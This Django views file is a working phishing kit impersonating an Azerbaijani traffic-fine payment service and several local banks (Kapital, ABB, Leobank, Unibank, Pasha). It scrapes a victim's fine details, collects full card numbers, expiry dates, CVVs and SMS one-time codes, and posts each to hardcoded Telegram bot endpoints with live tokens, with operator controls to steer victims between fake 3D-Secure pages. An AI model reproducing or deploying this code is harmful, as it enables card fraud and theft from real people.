from django.shortcuts import render
import requests
# Create your views here.
from django.views.decorators.csrf import csrf_exempt
from .models import ContactModel
from bs4 import BeautifulSoup
from django.http import JsonResponse
from django.shortcuts import render, redirect, get_object_or_404
import requests
@csrf_exempt
def index(request):
    context = {
        'display_error': 'none',  # if there's no error, set display_error to 'none'
    }
    return render(request, "index.html",context)


@csrf_exempt
def login(request):
    if request.method == "POST":
        request.POST
        Protcol = request.POST.get('clientLogin')
        ProtcolNumber = request.POST.get('invoiceCode')
        total_amount, father_name = check_data(Protcol, ProtcolNumber)
        client_ip = get_client_ip(request)
        # contact.save(Protcol,ProtcolNumber,client_ip)
        if total_amount == 'error':
            context = {
                'display_error': '',  # if there's no error, set display_error to 'none'
            }
            return render(request, 'index.html',context)
        print(father_name)
        subtotal=int(father_name)- int(father_name)*25/100
        context={
            "total_amount":total_amount,
            "father_name":father_name,
            "subtotal":subtotal
        }
        contact = ContactModel(ip=client_ip,amount=subtotal)
        contact.page_name="Melumat Doldurma sehifesi"
        contact.save()
        request.session['contact_id'] = contact.id
        ip_address = client_ip
        country = get_country_from_ip(ip_address)
        if country!= "AZ":
            country= 'Şübhəli İP!'
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')

        return render(request, 'cerime2.html',context)
    context = {
        'display_error': 'none',  # if there's no error, set display_error to 'none'
    }

    return render(request, 'index.html',context)



def check_data(Protcol,ProtcolNumber):

    url = "https://portmanat.az/project/withpc/652/dyp-qerarli"
    data = {
        "invoiceCode": f"{ProtcolNumber}",
        "clientLogin": f"{Protcol}",
        "templateName": "",
        "payment_type": "pc",
        "click": ""
    }
    print(data)
    try:
        response = requests.post(url=url, data=data)
        print(response)
        html_response = response.text
        soup = BeautifulSoup(html_response, 'html.parser')
        name_tags = soup.find_all('td', string='Ad, Soyad')
        if name_tags:
            name = name_tags[0].find_next_sibling('td').string
        else:
            name = 'error'
        # Finding the total debt
        debt_tags = soup.find_all('td', string='Ümumi borcunuz')
        if debt_tags:
            debt = debt_tags[0].find_next_sibling('td').string.split()[0]
        else:
            debt = 'error'

        return name , debt
    except requests.exceptions.RequestException as e:
        print(f'Xeta bas verdi : {e}')

    
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


@csrf_exempt
def payment(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context={
        "amount":contact.amount
    }
    return render(request, "pay.html", context)



@csrf_exempt
def payments(request):
    if request.method == "POST":
        cardnumber= request.POST.get("cardnumber")
        contact_id = request.session.get('contact_id')
        contact = ContactModel.objects.get(id=contact_id)
        contact_id = request.session.get('contact_id')
        contact = ContactModel.objects.get(id=contact_id)
        mm_= request.POST.get("mm")
        cvv_= request.POST.get("cvv")
        mm = mm_[:2]
        yy = mm_[3:]
        merged_output = cardnumber.replace(" ", "")
        contact.cc = merged_output
        contact.mm = mm
        contact.yy = yy
        contact.cvv = cvv_
        contact.bankname=""
        contact.page_name="/Loading.html"
        contact.save()
        country = get_country_from_ip(contact.ip)
        if country!= "AZ":
            country= 'Şübhəli İP!'
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{contact.amount}\nCC:{cardnumber}|{contact.mm}|{contact.yy}|{contact.cvv} \n@kitayskiadam @TetaLab @alienfx')

        return render(request, "pages/loading.html",{'last_contact_id': contact.id})
    return render(request, "pay.html")


def check_approval_status(request, contact_id):
    try:
        contact = ContactModel.objects.get(pk=contact_id)
        return JsonResponse({'bankname': contact.bankname})
    except ContactModel.DoesNotExist:
        return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)

@csrf_exempt
def kapital(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.bankname=""
    contact.page_name="/Kapital"
    contact.save()
    contex = {
        'last_contact_id': contact.id,
        "amount":contact.amount,
        "display":contact.hidden_type
    }
    return render(request, "pages/kapital.html",contex)


@csrf_exempt
def abb(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    
    context = {
    'amount':contact.amount,
    'cc': contact.cc[-4:],
    "display":contact.hidden_type
    }
    contact.page_name="/loading"
    contact.page_name="/abb3d"
    
    contact.save()
    print(context)
    return render( request,'pages/abb3d.html' ,context)


@csrf_exempt  
def dseckapital(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    if request.method == "POST":
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        if len(input4) == 0:
            # handle the case when input6 is empty
            # for example, you can display an error message to the user
            return render(request, 'pages/kapital.html')
        concatenated = input1 + input2+input3+input4
        contact.sms=concatenated
        contact.bankname=""
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}')
        return render( request,'pages/loading.html' )
    
    return render( request,'pages/loading.html',context )

@csrf_exempt
def dsecazericard(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    if request.method == "POST":
        sms = request.POST.get('secpass')
        contact_id = request.session.get('contact_id')
        contact = ContactModel.objects.get(id=contact_id)
        contact.sms=sms
        contact.save()
        context = {
            'last_contact_id': contact.id,
            "display":contact.hidden_type

        }
        contact.bankname=""
        contact.page_name="/loading"
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')

        return render( request,'pages/loading.html',context )
    return render( request,'pages/loading.html',context )


def rabite(request):
    visit_count_obj, _ = VisitCount.objects.get_or_create(id=1)

    # Increment the visit count
    visit_count_obj.count += 1
    visit_count_obj.save()
    return render( request,'pages/rabite.html' )

def leobank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "leobank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

@csrf_exempt
def leobank3d(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    if request.method == "POST":
        return render( request,'pages/error.html' )    
    context = {
    'last_contact_id': contact.id,
    'amount':contact.amount,
    'cc': contact.cc[-4:],
    "display":contact.hidden_type
    }
    contact.page_name="leobank"
    contact.save()
    return render( request,'pages/leo.html',context )
@csrf_exempt
def unibank(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    number = str(contact.phone)
    contact.bankname=""
    contact.page_name="/unibank3d"
    contact.save()
    context = {
        'number': number[-4:],
        'amount': contact.amount,
        'cc': contact.cc[-4:],
        "display":contact.hidden_type
    }
    
    return render( request,'pages/unibank3d.html',context )


@csrf_exempt
def unibank3d(request):
    sms = request.POST.get('secpass')
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.sms=sms
    contact.bankname=""
    contact.page_name="/loading"
    contact.save()
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    
    if len(sms) == 0:
        # handle the case when input6 is empty
        # for example, you can display an error message to the user
        contact.page_name="/unibank3d"
        contact.save()
        return render(request, 'pages/unibank3d.html')
    response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')
    return render( request,'pages/loading.html',context )



@csrf_exempt
def pashabank(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    number = str(contact.phone)
    contact.bankname=""
    context = {
        'last_contact_id': contact.id,
        'number': number[-4:],
        'amount': contact.amount,
        'cc': contact.cc[-4:],
        "display":contact.hidden_type
    }
    contact.page_name="/pasha"
    contact.save()
    return render( request,'pages/pasha.html',context )


def error(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="/error"
    contact.save()
    return render( request,'pages/error.html' )



@csrf_exempt
def pashabank3d(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    if request.method == "POST":
        number = str(contact.phone)
        contact.bankname=""
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        input5 = request.POST.get("input5")
        input6 = request.POST.get("input6")
        if len(input5) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/pasha.html',)
        concatenated = input1+input2 +input3+input4+input5+input6
        contact = ContactModel.objects.latest('created_at')
        contact.sms=concatenated
        contact.page_name="/loading"
        contact.save()
        return render( request,'pages/loading.html',context )
    contact.bankname=""
    contact.page_name="/loading"
    contact.save()
    return render( request,'pages/loading.html',context )




def check_status(request):
    last_contact = get_object_or_404(ContactModel.objects.order_by('-created_at')[:1])
    data = {
        'error_message': last_contact.error_message
    }
    return JsonResponse(data)


def smserror(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    # Update the hidden_type field
    contact.hidden_type = ""
    contact.save()
    print(contact.hidden_type)
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})


def smserrorfix(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    # Update the hidden_type field
    contact.hidden_type = "none"
    contact.save()
    print(contact.hidden_type)
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})


def contact_list_api(request):
    contacts = ContactModel.objects.order_by('-id').values()  # Only return contacts with non-null value for cvv
    return JsonResponse({'contacts': list(contacts)})



def contact_approve(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "kapital"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})



def get_country_from_ip(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/country")
        if response.status_code == 200:
            return response.text.strip()
        else:
            return "Unknown"
    except requests.RequestException:
        return "Error"